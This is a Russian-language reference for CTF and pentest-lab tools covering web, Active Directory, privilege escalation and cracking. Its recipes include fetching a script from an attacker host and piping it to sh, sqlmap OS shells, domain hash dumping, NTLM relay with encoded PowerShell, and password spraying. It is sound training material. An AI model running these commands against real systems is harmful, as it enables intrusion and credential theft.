# Практический справочник инструментов для CTF, пентеста и HackTheBox

Плотная документация по ~50 ключевым инструментам, сгруппированным по доменам. Для каждого: назначение, установка, разбор флагов на русском и практические рецепты. Настройки рассчитаны на CTF/HTB/пентест-лаборатории, где агрессивная нагрузка допустима.

## TL;DR
- Это справочник-документация: для каждого инструмента приведены назначение, установка, **расшифровка флагов на русском** и готовые команды; для веба ключевые тулзы — `nmap`, `ffuf`, `nuclei`, `sqlmap`; для AD — `netexec` + `impacket` + `bloodhound`/`certipy`; для pwn/RE — `pwntools` + `gdb/pwndbg` + `radare2`.
- Флаги выверены по официальным источникам (nmap.org/book, sqlmap wiki, projectdiscovery docs, hashcat, pwntools, volatility3 docs, ly4k/Certipy, ticarpi/jwt_tool). Важные значения по умолчанию: `nmap` сканирует top‑1000 портов (`-p-` = все 65535), `sqlmap --technique` по умолчанию `BEUSTQ`, `nuclei -rl` = 150 rps, `-c`/`-bs` = 25.
- Документ нейтрален к этикету bug‑bounty: никаких throttle/anti‑ban; настройки выбраны под скорость в лабораториях.

## Key Findings (как пользоваться справочником)
- Группировка по фазам: WEB → NETWORK/AD → PRIVESC → CRACKING → PWN → RE → CRYPTO → FORENSICS/STEGO → EXPLOIT/PIVOT.
- Каждый флаг снабжён кратким объяснением смысла, а не просто перечислен.
- Для инструментов projectdiscovery (`nuclei`, `httpx`, `katana`) глобальные опции идут до позиционных; для `volatility3` глобальные опции (`-f`, `-r`, `-o`) ставятся **до** имени плагина.

---

# WEB — разведка и эксплуатация

## 1. nmap — сканер портов, сервисов и NSE
**Назначение:** обнаружение хостов, открытых портов, версий сервисов, ОС и запуск скриптов NSE.
**Установка:** `sudo apt install nmap`.

**Типы сканирования:**
- `-sS` — SYN/«half-open» скан (по умолчанию от root, быстрый и относительно тихий).
- `-sT` — полный TCP connect (когда нет raw-сокетов, например из-под непривилегированного пользователя или через proxychains).
- `-sU` — UDP-скан (медленный; комбинируй с `--top-ports`).
- `-sV` — определение версий служб по баннерам/пробам.
- `-sC` — запуск набора скриптов по умолчанию (эквивалент `--script=default`); считается интрузивным.
- `-sn` — только host discovery (ping sweep), без сканирования портов.
- `-Pn` — пропустить host discovery, считать хост живым (обязательно для хостов, блокирующих ICMP, типично для HTB).
- `-sA` — ACK-скан для маппинга правил фаервола.

**Выбор портов и тайминг:**
- `-p 80,443` / `-p 1-1000` — конкретные порты/диапазон; `-p-` — **все 65535 портов** (по умолчанию nmap сканирует только top‑1000); `-F` — fast, top‑100.
- `--top-ports N` — N наиболее частых портов. По официальной документации Nmap (Port Selection): «By default, Nmap scans the top 1,000 ports... This catches roughly 93% of the TCP ports and 49% of the UDP ports. With the -F (fast) option, only the top 100 ports are scanned, providing 78% TCP effectiveness and 39% for UDP».
- `-T0..-T5` — шаблоны тайминга: T0 paranoid (IDS-evasion), T3 normal (дефолт), T4 aggressive (рекомендован для HTB), T5 insane.
- `--min-rate N` / `--max-rate N` — минимум/максимум пакетов в секунду (например `--min-rate 5000` для быстрого `-p-`).

**Скрипты, ОС, агрессивный режим:**
- `-O` — определение ОС по TCP/IP fingerprint.
- `-A` — агрессивный режим. По официальной документации Nmap: «This option enables additional advanced and aggressive options. Presently this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute)» — с предупреждением, что script scanning интрузивен.
- `--script <имя|категория>` — запуск NSE-скриптов; категории: `default`, `safe`, `vuln`, `auth`, `brute`, `discovery`, `exploit`. Пример: `--script "http-*"`, `--script vuln`.
- `--script-args key=val` — аргументы скриптам (например `--script-args http.useragent=...`).

**Вывод:** `-oN` (текст), `-oX` (XML), `-oG` (grepable), `-oA basename` (все три сразу).

**Обход фаервола:** `-f` (фрагментация пакетов); `-D RND:10` или `-D decoy1,ME,decoy2` (decoy-адреса); `--source-port 53` (спуф порта-источника, обход слабых ACL); `-S <IP>` (спуф source IP); `--data-length N` (добивка пакетов).

**Рецепты:**
```bash
nmap -sC -sV -oA nmap/initial 10.10.10.10          # стандартный первый скан HTB
nmap -p- --min-rate 5000 -T4 -oA nmap/allports 10.10.10.10   # все порты быстро
nmap -p 445 --script "smb-vuln-*" 10.10.10.10      # проверка SMB-уязвимостей
nmap -sU --top-ports 100 10.10.10.10               # топ UDP
nmap -Pn -D RND:5 --source-port 53 10.10.10.10     # уклонение
```
**Tip:** сначала быстрый `-p-` для поиска портов, затем точечный `-sC -sV -p <найденные>`.

## 2. ffuf — быстрый веб-фаззер (Go)
**Назначение:** перебор директорий/файлов, vhost-discovery, фаззинг параметров и значений.
**Установка:** `sudo apt install ffuf` или `go install github.com/ffuf/ffuf/v2@latest`.

**HTTP/ввод:**
- `-u URL` — цель; ключевое слово `FUZZ` ставится туда, куда подставлять слова (URL, заголовок, тело).
- `-w path:KEYWORD` — словарь; можно несколько с разными ключевыми словами (`-w users.txt:U -w pass.txt:P`).
- `-mode clusterbomb` — все комбинации словарей (декартово произведение); `pitchfork` — параллельно по индексам; `sniper` — по одному слову на позицию.
- `-X` — HTTP-метод (GET/POST/PUT…); `-d` — тело POST (`-d 'user=FUZZ&pass=x'`); `-H "Name: Value"` — заголовок (многократно), используется и для vhost: `-H "Host: FUZZ.target"`.
- `-b "NAME=VALUE"` — cookie; `-x http://127.0.0.1:8080` — прокси; `-replay-proxy` — отправлять в прокси только совпадения; `-request file` — взять сырой HTTP-запрос из файла; `-request-proto https`.

**Матчеры (что считать «попаданием»):** `-mc` коды (дефолт 200-299,301,302,307,401,403,405,500; `all` — всё); `-ms` размер; `-mw` слова; `-ml` строки; `-mr` регэксп; `-mt` время ответа (`>100`); `-mmode and|or`.
**Фильтры (что отбрасывать):** `-fc` коды; `-fs` размер; `-fw` слова; `-fl` строки; `-fr` регэксп; `-ft` время. `-ac` — автокалибровка (отсев типового «not found» по преднабору).
**Прочее:** `-e .php,.txt,.bak` (расширения); `-recursion` + `-recursion-depth N`; `-t 40` (потоки); `-rate N` (rps); `-maxtime N`; `-o out -of json|html|md|csv|all`; `-c` (цвет); `-v` (полный URL).

**Рецепты:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://t/FUZZ -mc all -fc 404
ffuf -w sub.txt -u http://t -H "Host: FUZZ.t" -fs 0          # vhost (фильтруй размер ложных)
ffuf -w users.txt:U -w pass.txt:P -u http://t/login -X POST -d 'u=U&p=P' -mode clusterbomb -fc 401
ffuf -w params.txt -u 'http://t/api?FUZZ=1' -fw 7            # поиск имён параметров
```
**Gotcha:** при «всё 200» используй `-mc all` + `-fs/-fw` по размеру/словам ложных ответов или `-ac`.

## 3. feroxbuster — рекурсивный контент-дискавери (Rust)
**Установка:** `sudo apt install feroxbuster`.
- `-u URL` (FUZZ не нужен — append к пути); `-w` словарь (дефолт raft-medium-directories); `-x pdf,js,php` (расширения, можно повторять/через запятую); `-t` потоки; `-d` глубина рекурсии (`-n`/`--no-recursion` отключить, `--force-recursion` включить принудительно); `-s 200,301` (статусы для показа), `-C 404` (фильтр статусов); `-S`/`--filter-size`, `-W`/`--filter-words`, `--filter-regex`; `-e`/`--extract-links` (вытаскивать ссылки из тела и сканить их — гибридный режим); `-r` follow redirects; `-k`/`--insecure` (игнор TLS); `--proxy`/`--burp`; `-o` вывод, `--json`; `-q`/`--silent` (тихо, для пайпов); `--resume-from file.state`; `-a` user-agent; `-T` timeout (дефолт 7s); `--auto-tune`/`--auto-bail`.
```bash
feroxbuster -u http://t -x php,txt,html -d 2 -t 100
cat hosts | feroxbuster --stdin --silent -s 200 301 302 -x js
```

## 4. gobuster — дискавери в режимах dir/dns/vhost/fuzz/s3
**Установка:** `sudo apt install gobuster`.
- Общие: `-w` словарь; `-t` потоки; `-o` вывод; `-q` тихо; `-k` игнор TLS.
- `dir`: `-u URL`; `-x php,txt` расширения; `-s`/`-b` статусы whitelist/blacklist; `-c` cookies; `-H` заголовки; `-r` follow redirects; `-d` discover backup; `--exclude-length N`.
- `dns`: `-d domain`; `-r resolver`; `--wildcard`; `-i` показать IP.
- `vhost`: `-u URL`; `--append-domain` (добавлять базовый домен к словам); `--exclude-length`.
- `fuzz`: `-u` с `FUZZ`.
```bash
gobuster dir -u http://t -w raft-medium-directories.txt -x php,txt -t 50
gobuster dns -d target.htb -w subdomains-top1million-5000.txt -i
gobuster vhost -u http://t --append-domain -w subdomains.txt
```

## 5. dirsearch — дискавери (Python)
**Установка:** `pipx install dirsearch` или `git clone`.
- `-u URL`; `-e php,asp,aspx,jsp,html,js` расширения (`-e _` без расширений); `-w` словарь; `-x 403,404` исключить статусы, `-i 200,301` включить; `-R N` рекурсия (`--recursion-depth`); `-t` потоки; `--cookie`, `-H`; `--random-agent`; `-o`/`--format`; `-r` follow redirects; `-f` форсить расширения для всех слов.
```bash
dirsearch -u http://t -e php,txt,bak -x 404 -t 50 --random-agent
```

## 6. httpx (ProjectDiscovery) — пробинг и фингерпринт HTTP
**Установка:** `go install github.com/projectdiscovery/httpx/cmd/httpx@latest`.
- `-u`/`-l` цель/список; `-sc`/`-status-code`; `-title`; `-td`/`-tech-detect` (Wappalyzer); `-server`/`-web-server`; `-cl`/`-content-length`; `-location`; `-ip`/`-cname`; `-favicon` (mmh3-хеш фавикона); `-jarm`; `-mc`/`-fc` match/filter по коду; `-ports 80,443,8080`; `-path /admin`; `-x`/`-method`; `-H`; `-json`; `-o`; `-threads`; `-rl` rate; `-probe` (показать FAILED/SUCCESS).
```bash
cat hosts.txt | httpx -sc -title -td -ip -favicon
```

## 7. katana (ProjectDiscovery) — краулер
**Установка:** `go install github.com/projectdiscovery/katana/cmd/katana@latest`.
- `-u` цель; `-d N` глубина; `-jc`/`-js-crawl` (парсить JS); `-kf`/`-known-files robots,sitemap`; `-headless`/`-hl` (Chromium); `-fs`/`-field-scope`; `-c` concurrency; `-p` parallelism; `-rl` rate; `-o`; `-f`/`-field url,path,...`; `-em`/`-ef` фильтр по расширениям; `-aff` (автозаполнение форм); `-xhr`.
```bash
katana -u https://t -d 5 -jc -kf all -o urls.txt
```

## 8. gau / waybackurls — исторические URL
- `waybackurls domain` — URL из Wayback Machine (по stdin/аргументу).
- `gau domain` — агрегатор (Wayback, Common Crawl, OTX, URLScan): `--threads`; `--subs` (включить поддомены); `--blacklist png,jpg,css`; `--fc` фильтр статусов; `--from`/`--to YYYYMM`; `--o`.
```bash
gau --subs target.htb | sort -u > urls.txt
echo target.htb | waybackurls > wb.txt
```

## 9. nuclei (ProjectDiscovery) — сканер по YAML-шаблонам
**Назначение:** обнаружение CVE/мисконфигов по шаблонам сообщества.
**Установка:** `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`; обновить шаблоны: `nuclei -ut`.
По Kali Tools: hashcat-подобная экосистема; nuclei использует YAML-DSL и тысячи шаблонов сообщества.

**Цели/шаблоны:** `-u`/`-target`; `-l list.txt`; `-t templates/` (файл/каталог); `-tags cve,rce,lfi`; `-id <template-id>`; `-severity critical,high`; `-as`/`-automatic-scan` (Wappalyzer→tags); `-et`/`-exclude-templates`; `-es`/`-exclude-severity`; `-w workflow.yaml`; `-im list|burp|jsonl|openapi|swagger`.
**DAST/фаззинг:** `-dast` (включить фаззинг-шаблоны); `-fuzzing-type replace|prefix|postfix|infix`.
**Скорость (по офиц. docs):** `-rl` rate-limit (rps, дефолт 150); `-c` concurrency = число параллельных шаблонов (дефолт 25); `-bs`/`-bulk-size` = число хостов параллельно на шаблон (дефолт 25); `-ss host-spray|template-spray`; `-timeout`; `-retries`.
**Матчеры/вывод:** `-mr`/`-matcher-status`; `-ms`/`-match-condition`; `-validate` (проверить синтаксис шаблона); `-jsonl`; `-stats`; `-o`; `-me`/`-markdown-export`; `-se`/`-sarif-export`; `-H` заголовок; `-update-templates`.
```bash
nuclei -u https://t -as -severity critical,high
nuclei -l live.txt -tags cve,exposure -c 50 -rl 500 -stats -o out.txt
nuclei -u https://t -t ./my-template.yaml -validate
```

## 10. sqlmap — автоматизация SQL-инъекций
**Установка:** `sudo apt install sqlmap`.
**Цель:** `-u URL`; `-r req.txt` (сырой HTTP-запрос, удобно из Burp); `-m bulk.txt` (много целей); `-d "mysql://user:pass@host:3306/db"` (прямое подключение); `-g dork`.
**Данные/аутентификация:** `--data="id=1"`; `--cookie`; `--headers`; `-p param` (тестировать конкретный параметр); `--random-agent`; `--csrf-token=token`/`--csrf-url=url`; `--proxy`/`--tor`.
**Детект:** `--level 1..5` (выше = больше тестов, при ≥2 тестируются Cookie, при ≥3 — User-Agent/Referer); `--risk 1..3` (выше = более «тяжёлые» payload’ы, риск для БД); `--dbms mysql` (подсказать СУБД).
**Техники:** `--technique=BEUSTQ` (по офиц. wiki: **B** boolean-blind, **E** error-based, **U** union, **S** stacked queries, **T** time-blind, **Q** inline; дефолт `BEUSTQ`). Важно: для доступа к ФС/ОС/реестру строка должна включать `S`. Boolean-blind по wiki извлекает каждый символ максимум за 7 HTTP-запросов (бисекция).
**Обход WAF:** `--tamper=between,space2comment,randomcase` (скрипты в `/usr/share/sqlmap/tamper/`); `--hex`; `--no-cast`.
**Перечисление/дамп:** `--dbs`; `--tables -D db`; `--columns -D db -T tbl`; `--dump -D db -T tbl -C col`; `--dump-all`; `--current-user`/`--current-db`/`--is-dba`; `--passwords`.
**Захват:** `--os-shell` (интерактивный шелл ОС); `--sql-shell`; `--file-read`/`--file-write`/`--file-dest`.
**Сервис:** `--batch` (отвечать дефолтами); `--threads 10`; `--flush-session` (сброс кэша); `--ignore-code 401`.
```bash
sqlmap -r req.txt -p id --batch --level 3 --risk 2 --dbs
sqlmap -r req.txt -D app -T users --dump --batch
sqlmap -u 'http://t/?id=1' --technique=U --tamper=space2comment --os-shell
```

## 11. ghauri — быстрый детектор/эксплуатация SQLi
**Установка:** `pipx install ghauri` / git.
- `-u`/`-r`; `--data`; `-p`; `--dbs`/`--tables`/`--columns`/`--dump`; `-D/-T/-C`; `--level`; `--technique BEST`; `--dbms`; `--batch`; `--proxy`. Похож на sqlmap, часто быстрее на blind.
```bash
ghauri -u 'http://t/?id=1' --dbs --batch
```

## 12. wpscan — сканер WordPress
**Установка:** `sudo apt install wpscan`; токен на wpscan.com.
- `--url`; `-e` enumerate с подопциями: `at` (all themes), `ap` (all plugins), `vp` (vuln plugins), `u` (users), `t`; `--plugins-detection passive|aggressive|mixed`; `--api-token TOKEN` (база уязвимостей); брутфорс: `-U users.txt -P pass.txt` (или `--passwords` + `--usernames`); `--password-attack wp-login|xmlrpc`.
```bash
wpscan --url http://t -e ap,at,u --plugins-detection aggressive --api-token TOKEN
wpscan --url http://t -U admin -P rockyou.txt
```

## 13. arjun / x8 — обнаружение HTTP-параметров
- **arjun:** `-u URL`; `-m GET|POST|JSON|XML` метод; `-w wordlist`; `-d delay`; `-t threads`; `--stable`; `-oT/-oJ` вывод; `--headers`.
- **x8:** `-u URL`; `-w params.txt`; `-X` методы; `-b` body template; `-H` заголовки; `--output`.
```bash
arjun -u http://t/api -m GET
x8 -u http://t/ -w params.txt -X POST
```

## 14. dalfox — XSS-сканер
**Установка:** `go install github.com/hahwul/dalfox/v2@latest`.
- Режимы: `url <URL>`; `file urls.txt`; `pipe` (из stdin).
- `-b`/`--blind https://collab` (blind XSS); `--waf-evasion`; `--deep-domxss`; `--custom-payload file`; `--skip-bav` (пропустить basic-other checks); `-H` заголовки; `-d` data; `--cookie`; `-o` вывод; `--mining-dict`/`--mining-dom` (поиск параметров).
```bash
dalfox url 'http://t/?q=1' --waf-evasion -b https://x.oast.pro
cat urls.txt | dalfox pipe --skip-bav
```

## 15. commix — инъекции команд ОС
**Установка:** `sudo apt install commix`.
- `-u URL`; `--data`; `-r req.txt`; `--cookie`; `-p param`; `--technique=classic|eval|time|file|tempfile` (`c|e|t|f`); `--os-cmd=whoami` (одна команда); `--os-shell`; `--level 1..3`; `--tamper`; `--random-agent`; `--batch`.
```bash
commix -u 'http://t/ping?ip=127.0.0.1' --os-shell
commix -r req.txt -p ip --technique=t --batch
```

## 16. SSTImap / tplmap — Server-Side Template Injection
- **SSTImap:** `-u URL`; `-d data`; `--cookie`; `-H`; `-e engine` (jinja2, twig, freemarker…); `-O os-shell`; `-S sql`; `--os-cmd`; `-L` список движков; `-r` raw request.
- **tplmap:** `-u`; `--data`; `--os-shell`; `--os-cmd`; `-e engine`; `--level`.
```bash
sstimap -u 'http://t/?name=John' --os-shell
```

## 17. jwt_tool — анализ и атаки на JWT
**Установка:** `git clone github.com/ticarpi/jwt_tool`.
По офиц. wiki:
- Без флагов — декод токена. `-T` интерактивный tamper; `-I` inject/fuzz (`-hc/-hv` header claim/value, `-pc/-pv` payload claim/value).
- `-C -d wordlist` — **крек** HMAC-секрета по словарю.
- `-X` **эксплойты:** `a` = alg:none; `n` = null signature; `b` = blank password; `s` = spoof JWKS (с `-ju URL`); `k` = key confusion (RS→HS, с `-pk pub.pem`); `i` = inject inline JWKS.
- `-S` **подпись:** `hs256/384/512` (секрет `-k`/`-p`), `rs256/...` (приватный ключ `-pr`), `ec256/...`, `ps256/...`.
- `-V` верификация (с `-pk`); `-M pb|er|at` режимы сканирования (playbook/errors/all-tests); `-t URL -rc "jwt=..."` — отправка в приложение.
```bash
python3 jwt_tool.py <JWT> -C -d rockyou.txt        # крек секрета
python3 jwt_tool.py <JWT> -X a                      # alg:none
python3 jwt_tool.py <JWT> -X k -pk public.pem       # key confusion
```

---

# NETWORK / SERVICES / ACTIVE DIRECTORY

## 18. netexec (nxc, бывш. crackmapexec) — мультипротокольный «швейцарский нож»
**Установка:** `pipx install netexec`.
**Протоколы:** `nxc smb|ldap|winrm|mssql|ssh|rdp|ftp|wmi <target>`.
**Аутентификация:** `-u user`/`-u users.txt`; `-p pass`/`-p pass.txt`; `-H NTHASH` (pass-the-hash); `-k` (Kerberos); `--local-auth` (локальная, не доменная); `-d domain`. Спрей: `nxc smb t -u users.txt -p 'Pass1' --no-bruteforce --continue-on-success`. Null/anon: `-u '' -p ''`.
**SMB-перечисление:** `--shares`; `--users`; `--groups`; `--local-groups`; `--rid-brute` (перебор RID для юзеров без креды); `--sessions`; `--loggedon-users`; `--pass-pol`; `--sam`; `--lsa`; `--ntds` (дамп NTDS.dit через DRSUAPI; `--ntds vss` через теневую копию).
**Выполнение команд:** `-x 'whoami'` (cmd); `-X '$PSVersionTable'` (PowerShell); `--exec-method smbexec|wmiexec|atexec`.
**Модули:** `-L` список; `-M lsassy` (дамп LSASS), `-M spider_plus` (рекурсивный обход шар, `-o READ_ONLY=false` для скачивания), `-M gpp_password`, `-M zerologon`, `-M nopac`, `-M petitpotam`.
**LDAP:** `--query "(filter)" attrs`; `--trusted-for-delegation`; `--password-not-required`; `--admin-count`; `--gmsa`; `-M daclread`.
```bash
nxc smb 10.10.10.10                                  # базовый отпечаток
nxc smb dc -u u -p p --shares --users --pass-pol
nxc smb dc -u u -p p --ntds                          # дамп хешей домена
nxc smb 10.10.10.0/24 -u u -H NTHASH --local-auth    # PtH по подсети
nxc winrm t -u u -p p -x whoami
```

## 19. impacket — набор Python-скриптов для протоколов Windows
**Установка:** `pipx install impacket` (бинарники `impacket-<tool>`).
Общий формат target: `domain/user:password@host` (+ `-hashes LM:NT` для PtH, `-k -no-pass` для Kerberos, `-dc-ip`).

- **secretsdump.py** — дамп секретов: SAM/LSA/NTDS. `impacket-secretsdump dom/u:p@host`; `-just-dc` (только домен через DRSUAPI/DCSync); `-just-dc-ntlm`; `-just-dc-user krbtgt`; `-sam SAM -system SYSTEM -security SECURITY LOCAL` (офлайн с хайвов); `-outputfile`.
- **GetUserSPNs.py** — Kerberoasting. `-request` (получить TGS-хеши), `-outputfile`, `-dc-ip`; `-stealth` (без SPN-фильтра в LDAP-запросе). Выход на hashcat `-m 13100`.
- **GetNPUsers.py** — AS-REP roasting. `-request`; `-usersfile users.txt`; `-format hashcat|john`; `-no-pass`; `-dc-ip`. Выход на hashcat `-m 18200`. Без `-request` — только показывает уязвимые (preauth disabled).
- **psexec.py / smbexec.py / wmiexec.py / dcomexec.py / atexec.py** — удалённое выполнение. psexec — сервис через ADMIN$ (шумно, нужен admin); wmiexec — semi-interactive через DCOM/135 (тише); smbexec — через bat-файл/сервис; atexec — через планировщик; dcomexec — через `-object MMC20|ShellWindows|ShellBrowserWindow`.
- **ntlmrelayx.py** — NTLM-relay (нужен SMB signing off). `-t smb://host`/`-tf targets.txt`; `-smb2support`; `--no-http-server`; `-c 'command'`; `-socks` (SOCKS-прокси для relayed-сессий); `-i` (интерактивный); `--escalate-user`.
- **GetADUsers.py** — список пользователей домена (`-all`). **lookupsid.py** — перебор SID→юзеры. **mssqlclient.py** — клиент MSSQL (`-windows-auth`, затем `enable_xp_cmdshell`). **ticketer.py** — генерация golden/silver TGT/TGS (`-nthash`, `-domain-sid`, `-domain`, `-spn`). **getTGT.py** — запрос TGT (overpass-the-hash), сохраняет ccache (`export KRB5CCNAME=...`). **getST.py** — Service Ticket с `-impersonate` (S4U).
```bash
impacket-secretsdump dom/u:p@dc -just-dc
impacket-GetUserSPNs dom/u:p -request -dc-ip 10.10.10.10
impacket-GetNPUsers dom/ -usersfile u.txt -no-pass -format hashcat -dc-ip 10.10.10.10
impacket-wmiexec dom/u@host -hashes :NTHASH
impacket-ntlmrelayx -tf targets -smb2support -c 'powershell -enc ...'
```

## 20. enum4linux-ng — перечисление SMB/RPC/LDAP
**Установка:** `pipx install enum4linux-ng` / git.
- `-A` (всё); `-U` users; `-G` groups; `-S` shares; `-P` pass-policy; `-o` OS; `-u/-p` креды; `-oY/-oJ` вывод YAML/JSON; `-R` rid-cycling.
```bash
enum4linux-ng -A 10.10.10.10
```

## 21. smbclient / smbmap — работа с SMB-шарами
- **smbclient:** `-L //host` (список шар); `//host/share`; `-U 'dom\user%pass'`; `-N` (null/без пароля); `--pw-nt-hash` (PtH); `-c 'ls;get file'` (команды). Внутри: `ls, cd, get, put, mget`.
- **smbmap:** `-H host`; `-u/-p/-d`; `-H` + `-R` (рекурсивный листинг); `--download path`; `--upload`; `-x 'command'`; `-r share`.
```bash
smbclient -L //10.10.10.10 -N
smbmap -H 10.10.10.10 -u u -p p -R
```

## 22. rpcclient — клиент MS-RPC
**Установка:** `sudo apt install samba`.
- `-U 'user%pass'` / `-N`; `rpcclient -U "" -N <host>` (null session).
- Полезные команды: `enumdomusers`, `enumdomgroups`, `queryuser <rid>`, `querygroup`, `lookupnames <name>`, `lookupsids <sid>`, `querydominfo`, `getdompwinfo`, `createdomuser`, `setuserinfo`.
```bash
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
```

## 23. ldapsearch — запросы к LDAP/AD
- `-x` (simple bind); `-H ldap://host` (URI); `-D 'dom\user'` (bind DN); `-w pass` (`-W` запрос пароля); `-b "DC=dom,DC=htb"` (base DN); `-s sub|base|one` (scope); `-o ldif_wrap=no` (без переноса). Анонимный bind: только `-x -H -b`.
```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=dom,DC=htb"   # анонимно
ldapsearch -x -H ldap://dc -D 'dom\u' -w p -b "DC=dom,DC=htb" '(samaccountname=svc*)'
```

## 24. kerbrute — Kerberos pre-auth brute (Go)
**Установка:** скачать бинарь из ropnop/kerbrute.
- Команды: `userenum` (валидные юзеры, **не** инкрементит badPwd → без локаута), `passwordspray`, `bruteuser`, `bruteforce` (combos из файла/stdin).
- Флаги: `-d domain`; `--dc IP`; `-t threads` (дефолт 10); `-o` лог; `-v` (логировать неудачи); `--safe` (стоп при локауте); `--delay`; `--downgrade` (RC4). При AS-REP-roastable юзерах сохраняет хеши (`--hash-file`).
```bash
kerbrute userenum -d dom.htb --dc 10.10.10.10 users.txt -o valid.txt
kerbrute passwordspray -d dom.htb --dc 10.10.10.10 valid.txt 'Winter2026!'
```
**Warning:** `passwordspray`/`bruteuser` инкрементят badPwd и могут залочить аккаунты — учитывай pass-policy.

## 25. responder — отравление LLMNR/NBT-NS/mDNS
**Установка:** `sudo apt install responder`.
- `-I eth0` (интерфейс, обязателен); `-w` (WPAD-rogue прокси); `-v` (подробно); `-A` (analyze — только слушать, не отравлять); `-F`/`-P` (force WPAD/Proxy auth); `-dwv`. Захваченные NetNTLMv2 → hashcat `-m 5600`. Конфиг `/etc/responder/Responder.conf`.
```bash
sudo responder -I tun0 -wv
sudo responder -I tun0 -A          # пассивный анализ
```

## 26. evil-winrm — WinRM-шелл
**Установка:** `gem install evil-winrm`.
- `-i IP`; `-u user`; `-p pass`; `-H NTHASH` (PtH); `-s /scripts/` (каталог PS1 для `Invoke-`); `-e /exes/` (каталог exe для `Invoke-Binary`); `-S` (SSL/5986); `-c`/`-k` (cert auth). В сессии: `upload`, `download`, `menu`.
```bash
evil-winrm -i 10.10.10.10 -u admin -H 32196b56ffe6f45e294117b91a83bf38
```

## 27. bloodhound / bloodhound-python — граф атак AD
- **bloodhound-python** (сборщик с Linux): `-u user -p pass -d dom -c All -ns <DC-IP>` (`-c` методы: All/DCOnly/Session/ACL…); `--zip`; `-dc dc.dom`; `-k` Kerberos.
- **SharpHound** (с Windows): `-c All`, `--zip`. Импорт zip в GUI BloodHound; запросы по pre-built queries (Shortest path to DA и т.п.).
```bash
bloodhound-python -u u -p p -d dom.htb -c All -ns 10.10.10.10 --zip
```

## 28. certipy — атаки на AD CS (ESC1–ESC16)
**Установка:** `pipx install certipy-ad`.
**Команды:** `find` (перечислить CA/шаблоны/уязвимости), `req` (запросить сертификат), `auth` (PKINIT/«pass-the-cert» → TGT + NTLM), `relay` (ESC8/ESC11), `ca` (управление CA, `-add-officer`), `template` (`-write-default-configuration` делает шаблон ESC1-уязвимым), `shadow` (Shadow Credentials), `forge` (Golden Certificate).
- `find`: `-u user@dom -p pass -dc-ip IP`; `-vulnerable`; `-enabled`; `-stdout`/`-old-bloodhound`; `-hide-admins`.
- `req`: `-u -p -dc-ip`; `-target CA.dom` (DNS CA); `-ca 'CORP-CA'`; `-template ESC1`; `-upn administrator@dom` и/или `-dns`; `-sid`. Сохраняет `.pfx`.
- `auth`: `-pfx admin.pfx -dc-ip IP` → TGT и/или NT-хеш.
```bash
certipy find -u u@dom -p p -dc-ip 10.10.10.10 -vulnerable -enabled
certipy req -u u@dom -p p -dc-ip 10.10.10.10 -target CA.dom -ca CORP-CA -template ESC1 -upn administrator@dom
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## 30. hydra — онлайн-брутфорс
**Установка:** `sudo apt install hydra`.
- `-l user`/`-L users.txt`; `-p pass`/`-P pass.txt`; `-C combo.txt` (user:pass); `-t N` (потоки, дефолт 16); `-f` (стоп при первом успехе на хосте, `-F` для `-M`); `-s port`; `-S` (SSL); `-V`/`-vV` (показ попыток); `-M targets.txt`; `-e nsr` (n=пустой, s=логин как пароль, r=реверс).
- **http-post-form / http-get-form:** синтаксис `"path:body:fail_or_success"`, где `^USER^`/`^PASS^` — подстановки, `F=строка_ошибки` или `S=строка/код_успеха`. Модули: `ssh`, `ftp`, `smb`, `rdp`, `mysql`, `http-head` (basic auth).
```bash
hydra -l admin -P rockyou.txt 10.10.10.10 ssh -t 4
hydra -L u.txt -P p.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -V
hydra -l admin -P rockyou.txt -f 10.10.10.10 http-get-form "/admin/:user=^USER^&pass=^PASS^:S=302"
```

---

# PRIVILEGE ESCALATION (enum)

## 31. linpeas / winpeas — авто-энумерация повышения привилегий
- **linpeas.sh** (Linux): `./linpeas.sh`; `-a` (all checks); `-s` (stealth/superfast меньше); `-e` (extended); цветной вывод (🔴/🟡 = высокий интерес). Запуск без записи на диск: `curl http://attacker/linpeas.sh | sh`.
- **winPEAS** (Windows): `winPEASx64.exe`; модули `systeminfo`, `userinfo`, `servicesinfo`, `applicationsinfo`; `quiet`; `log`. Есть `.bat` версия.
```bash
curl 10.10.14.1/linpeas.sh | sh
```

## 32. pspy — мониторинг процессов без root
**Установка:** скачать `pspy64`.
- `-p` (мониторить процессы), `-f` (файловые события), `-i N` (интервал в мс), `-r dir` (рекурсивно следить за каталогами). Ловит cron-задачи и команды от root.
```bash
./pspy64 -pf -i 1000
```

## 33. GTFOBins / LOLBAS — справочники злоупотреблений бинарями
- **GTFOBins** (Linux): как легитимный бинарь даёт shell/чтение/запись/SUID/sudo. Рабочий цикл: `sudo -l` (что разрешено), `find / -perm -4000 2>/dev/null` (SUID), `getcap -r / 2>/dev/null` (capabilities) → проверить найденное на GTFOBins.
- **LOLBAS** (Windows): легитимные бинарники (certutil, mshta, regsvr32) для загрузки/выполнения.
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## 34. linux-exploit-suggester / windows-exploit-suggester
- **les.sh** (Linux): сопоставляет версию ядра с публичными эксплойтами; `--kernel <ver>`; `--uname`.
- **wesng / windows-exploit-suggester** (Windows): на вход `systeminfo` → список недостающих патчей/CVE. `wes.py systeminfo.txt`.
```bash
./linux-exploit-suggester.sh
python wes.py systeminfo.txt
```

---

# КРЕКИНГ ПАРОЛЕЙ

## 35. hashcat — GPU-крекер
**Установка:** `sudo apt install hashcat`. По Kali Tools — поддерживает 7 режимов атак и 300+ алгоритмов (v7.x).
**Режимы атак (`-a`):** `0` straight (словарь); `1` combinator (два словаря); `3` mask/brute; `6` hybrid словарь+маска; `7` hybrid маска+словарь.
**Маски:** `?l` a-z, `?u` A-Z, `?d` 0-9, `?s` спецсимволы, `?a` всё печатное, `?h`/`?H` hex, `?b` байт. Пример: `?u?l?l?l?l?d?d`.
